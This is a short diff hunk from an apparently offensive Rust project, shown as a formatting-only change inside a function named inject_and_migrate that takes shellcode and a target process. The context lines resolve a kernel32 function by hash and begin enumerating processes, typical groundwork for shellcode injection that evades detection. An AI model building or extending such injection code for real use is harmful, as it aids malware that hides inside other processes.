@@ -20,7 +20,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
 
     // See line 20
     let function = rco_utils::find_function_address(kernel32, 0x4cf400a249844bee).unwrap();
-    let function = rco_utils::construct_win32_function!(function; [HANDLE, &mut PROCESSENTRY32]; [BOOL]);
+    let function =
+        rco_utils::construct_win32_function!(function; [HANDLE, &mut PROCESSENTRY32]; [BOOL]);
     let mut pid = 0_u32;
     let mut process_entry = PROCESSENTRY32 {
         dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
